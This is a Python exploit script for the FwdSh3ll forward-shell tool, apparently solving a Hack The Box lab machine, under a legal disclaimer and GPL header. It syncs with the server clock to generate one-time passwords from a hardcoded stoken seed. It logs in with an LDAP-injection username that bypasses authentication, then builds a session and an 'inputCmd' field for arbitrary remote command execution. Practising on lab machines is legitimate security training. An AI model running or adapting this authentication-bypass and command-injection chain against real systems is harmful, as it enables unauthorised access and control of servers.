#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""LEGAL DISCLAIMER

FwdSh3ll was written for use in educational purposes only. Using this tool
for attacking web servers without prior mutual consistency can be considered
as an illegal activity. It is the final user's responsibility to obey all
applicable local, state and federal laws.

The author assume no liability and is not responsible for any misuse or
damage caused by this tool.
"""

"""LICENSE

Copyright (C) 2019 Sam Freeside

This file is part of FwdSh3ll.

FwdSh3ll is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

FwdSh3ll is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with FwdSh3ll.  If not, see <http://www.gnu.org/licenses/>.
"""

"""
HTB box:     https://www.hackthebox.eu/home/machines/profile/172
Target URL:  http://10.10.10.122/page.php
"""

from datetime import datetime
from subprocess import check_output

import requests

URL = 'http://10.10.10.122/login.php'
OTP = '285449490011357156531651545652335570713167411445727140604172141456711102716717000'


def _get_otp():
	local = datetime.utcnow()
	server = datetime.strptime(requests.head(URL).headers['Date'], '%a, %d %b %Y %X %Z')
	offset = int((server - local).total_seconds())

	cmd = [
		'stoken',
		f'--token={OTP}',
		'--pin=0000',
		f'--use-time={"%+d" % offset}'
	]

	return check_output(cmd).decode().strip()


def gen_payload(cmd):
	session = requests.session()

	data = {
		'inputUsername': r'ldapuser%29%29%29%00',
		'inputOTP': _get_otp()
	}

	resp = session.post(URL, data=data)
	cookies = session.cookies.get_dict()

	data = {
		'inputCmd': cmd,
		'inputOTP': _get_otp()
	}

	return (cookies, data)


if __name__ == '__main__':
	print(gen_payload(cmd=None))
